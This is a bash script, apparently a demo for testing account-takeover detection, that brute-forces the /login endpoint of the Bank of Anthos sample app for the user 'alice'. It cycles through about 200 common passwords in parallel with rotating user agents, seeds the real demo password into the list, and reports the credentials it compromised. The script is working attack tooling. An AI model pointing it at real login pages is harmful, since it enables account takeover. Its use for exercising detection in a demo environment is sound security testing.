#!/usr/bin/env bash
# Password attack against the Bank of Anthos frontend /login endpoint, targeting
# a single account (alice). Iterates a wordlist of ~200 common passwords, with
# the real demo password mixed in so AAP's account-takeover detection sees a
# legitimate success at the end of the failure storm.
#
# Usage:
#   FRONTEND_URL=http://<frontend-host> ./docs/atk-credential-stuffing.sh
#   CONCURRENCY=20 FRONTEND_URL=... ./docs/atk-credential-stuffing.sh
#
# Env vars:
#   FRONTEND_URL  base URL of the frontend (default http://localhost:8080)
#   TARGET_USER   account to attack (default alice)
#   CONCURRENCY   parallel in-flight requests (default 10)
#   DELAY_MS      sleep between batch dispatches in ms (default 0)

set -u

FRONTEND_URL="${FRONTEND_URL:-http://localhost:8080}"
LOGIN_URL="${FRONTEND_URL%/}/login"

TARGET_USER="${TARGET_USER:-alice}"
CONCURRENCY="${CONCURRENCY:-10}"
DELAY_MS="${DELAY_MS:-0}"

# ~200 common breached passwords, with `bankofanthos` (the real demo password)
# salted in around the middle so the attack eventually lands a valid login.
PASSWORDS=(
  123456 password 12345678 qwerty 123456789
  12345 1234 111111 1234567 dragon
  123123 baseball abc123 football monkey
  letmein shadow master 666666 qwertyuiop
  123321 mustang 1234567890 michael 654321
  superman 1qaz2wsx 7777777 fuckyou 121212
  000000 qazwsx 123qwe killer trustno1
  jordan jennifer zxcvbnm asdfgh hunter
  buster soccer harley batman andrew
  tigger sunshine iloveyou 2000 charlie
  robert thomas hockey ranger daniel
  starwars klaster 112233 george computer
  michelle jessica pepper 1111 zxcvbn
  555555 11111111 131313 freedom 777777
  pass maggie 159753 aaaaaa ginger
  princess joshua cheese amanda summer
  love ashley 6969 nicole chelsea
  biteme matthew access yankees 987654321
  dallas austin thunder taylor matrix
  william corvette hello martin secret
  bankofanthos
  hannah samantha cookie chicken maverick
  diablo bulldog phoenix mickey bailey
  knight iceman tigers purple andrea
  horny dakota player morgan boomer
  cowboys edward charles girls coffee
  rabbit peanut johnny gandalf spanky
  winter brandy compaq carlos tennis
  james mike brandon fender anthony
  ferrari chicago joseph welcome1 chris
  panther yamaha justin banana driver
  marine angels fishing david wilson
  dennis captain chester smokey xavier
  steelers smith doctor stupid saturn
  gemini apples august canada blazer
  golf bond007 bear tiger doggie
  november shelby archie florida boston
  giants colorado seattle texas vegas
  password1 password123 admin admin123 root
  qwerty123 changeme guest test123 demo
  user123 login default passw0rd p@ssw0rd
  Welcome1 letmein1 asdf1234 abcdef qwerty1
)

USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"
  "python-requests/2.31.0"
  "curl/8.4.0"
)

SUCCESS_FILE=$(mktemp)
FAIL_FILE=$(mktemp)
trap 'rm -f "$SUCCESS_FILE" "$FAIL_FILE"' EXIT

attempt() {
  local pass="$1"
  local ua="${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}"

  local headers
  headers=$(curl -s -i -o /dev/null -D - \
    -A "$ua" \
    --data-urlencode "username=$TARGET_USER" \
    --data-urlencode "password=$pass" \
    --max-time 5 \
    "$LOGIN_URL" 2>/dev/null || true)

  if echo "$headers" | grep -qiE '^set-cookie:.*token='; then
    printf '[%s] \033[32mPWN\033[0m %-15s : %s\n' "$(date -u +%H:%M:%S)" "$TARGET_USER" "$pass"
    echo "$TARGET_USER:$pass" >> "$SUCCESS_FILE"
  else
    printf '[%s]     %-15s : %s\n' "$(date -u +%H:%M:%S)" "$TARGET_USER" "$pass"
    echo "$TARGET_USER:$pass" >> "$FAIL_FILE"
  fi
}

ATTEMPTS=${#PASSWORDS[@]}

echo "==> Target:  $LOGIN_URL"
echo "User:        $TARGET_USER"
echo "Passwords:   $ATTEMPTS"
echo "Concurrency: $CONCURRENCY"
echo "----"

for ((i = 0; i < ATTEMPTS; i++)); do
  attempt "${PASSWORDS[$i]}" &
  if (( (i + 1) % CONCURRENCY == 0 )); then
    wait
    if (( DELAY_MS > 0 )); then
      sleep "$(awk -v ms="$DELAY_MS" 'BEGIN{print ms/1000}')"
    fi
  fi
done
wait

successes=$(wc -l < "$SUCCESS_FILE" | tr -d ' ')
failures=$(wc -l < "$FAIL_FILE" | tr -d ' ')

echo "----"
echo "Total:     $ATTEMPTS"
echo "Successes: $successes"
echo "Failures:  $failures"
if (( successes > 0 )); then
  echo "Compromised credentials:"
  sort -u "$SUCCESS_FILE" | sed 's/^/  /'
fi
